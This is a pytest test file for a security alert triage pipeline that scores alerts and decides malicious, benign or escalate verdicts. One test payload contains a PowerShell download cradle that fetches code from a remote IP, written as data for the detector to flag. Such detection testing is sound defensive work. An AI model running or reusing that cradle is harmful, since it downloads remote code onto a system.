"""Deterministic pipeline: scoring paths and verdict decisions."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from packages.enrich.pipeline import EnrichmentPipeline
from packages.schemas.models import Alert, Disposition, Severity

NOW = datetime(2026, 1, 15, 12, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def pipeline() -> EnrichmentPipeline:
    return EnrichmentPipeline.from_data_dir()


def alert(payload: str, **kw: object) -> Alert:
    fields: dict[str, object] = {
        "id": "t-1",
        "source": "edr",
        "sensor_id": "edr-1",
        "severity": Severity.MEDIUM,
        "title": "test",
        "event_time": NOW,
        "ingest_time": NOW,
        "payload": payload,
    }
    fields.update(kw)
    return Alert(**fields)  # type: ignore[arg-type]


def test_intel_hit_is_decisively_malicious(pipeline: EnrichmentPipeline) -> None:
    a = alert("beacon to 185.220.101.7 every 60s", dst_ip="185.220.101.7")
    result = pipeline.enrich(a)
    decision = pipeline.decide(a, result, verdict_id="v")
    assert not decision.escalate
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.MALICIOUS


def test_behavioral_download_cradle_without_intel_is_malicious(
    pipeline: EnrichmentPipeline,
) -> None:
    a = alert(
        "powershell ran (New-Object Net.WebClient).DownloadString('http://176.113.115.19/x')",
        severity=Severity.HIGH,
    )
    decision = pipeline.decide(a, pipeline.enrich(a), verdict_id="v")
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.MALICIOUS


def test_allowlisted_scanner_is_benign(pipeline: EnrichmentPipeline) -> None:
    a = alert("scan from scanner host", src_ip="10.13.0.50")
    decision = pipeline.decide(a, pipeline.enrich(a), verdict_id="v")
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.BENIGN


def test_engagement_window_offsets_attack_tooling(pipeline: EnrichmentPipeline) -> None:
    a = alert(
        "simulated credential-access tooling executed",
        severity=Severity.HIGH,
        host="WS-1031",
        event_time=datetime(2026, 1, 14, 9, 0, tzinfo=UTC),
    )
    result = pipeline.enrich(a)
    assert any(s.startswith("engagement_window") for s in result.signals)
    decision = pipeline.decide(a, result, verdict_id="v")
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.BENIGN


def test_documentation_range_indicator_is_context_not_threat(
    pipeline: EnrichmentPipeline,
) -> None:
    a = alert(
        "digest references historical indicator 203.0.113.10 from a published report",
        severity=Severity.INFO,
    )
    result = pipeline.enrich(a)
    assert any(r.kind == "reserved_range" for r in result.records)
    decision = pipeline.decide(a, result, verdict_id="v")
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.BENIGN


def test_unknown_hash_on_server_escalates(pipeline: EnrichmentPipeline) -> None:
    unknown = "e" * 64
    a = alert(
        f"unrecognized binary SHA256: {unknown} executed",
        host="SRV-2003",
    )
    decision = pipeline.decide(a, pipeline.enrich(a), verdict_id="v")
    assert decision.escalate


def test_dga_shaped_domain_escalates(pipeline: EnrichmentPipeline) -> None:
    a = alert("query for xj4k9pzq2m.top allowed", severity=Severity.LOW)
    result = pipeline.enrich(a)
    assert any(s.startswith("dga_like") for s in result.signals)
    assert pipeline.decide(a, result, verdict_id="v").escalate


def test_known_good_hash_does_not_escalate(pipeline: EnrichmentPipeline) -> None:
    from packages.evals import pools

    a = alert(f"update package SHA256: {pools.GOOD_SHA256[0]} verified", severity=Severity.LOW)
    decision = pipeline.decide(a, pipeline.enrich(a), verdict_id="v")
    assert decision.verdict is not None
    assert decision.verdict.disposition == Disposition.BENIGN


def test_storm_mode_flags_degraded(pipeline: EnrichmentPipeline) -> None:
    a = alert("ordinary internal event", severity=Severity.LOW)
    result = pipeline.enrich(a, storm_mode=True)
    assert result.degraded
    assert any(r.kind == "degraded_note" for r in result.records)


def test_parent_domain_intel_match(pipeline: EnrichmentPipeline) -> None:
    a = alert("queries to a1b2c3.secure-login-verify.com spiked")
    result = pipeline.enrich(a)
    hits = [r for r in result.records if r.kind == "intel_hit"]
    assert hits and hits[0].detail["matched"] == "secure-login-verify.com"


def test_long_low_digit_domain_is_not_dga(pipeline: EnrichmentPipeline) -> None:
    a = alert("query for stackoverflow.com answered", severity=Severity.LOW)
    result = pipeline.enrich(a)
    assert not any(s.startswith("dga_like") for s in result.signals)


def test_medium_confidence_intel_hit_scores_but_does_not_hard_close() -> None:
    from packages.enrich.intel import AssetInventory, IntelRecord, ThreatIntel

    intel = ThreatIntel(
        indicators={
            "45.155.205.9": IntelRecord(
                value="45.155.205.9",
                type="ipv4",
                confidence=0.6,
                source="feed:low-trust",
                tags=["scanner"],
            )
        },
        known_good_sha256=set(),
        scanner_ips=set(),
        office_egress_ips=set(),
        trusted_domains=set(),
        pentest_engagements=[],
    )
    pipe = EnrichmentPipeline(intel, AssetInventory({}))
    a = alert("connection to 45.155.205.9 observed", dst_ip="45.155.205.9")
    result = pipe.enrich(a)
    assert any(s.startswith("intel_hit_medium") for s in result.signals)
    # 15 (severity) + 40 (medium hit) = 55 -> escalation band, NOT auto-malicious.
    assert result.score == 55.0
    assert pipe.decide(a, result, verdict_id="v").escalate
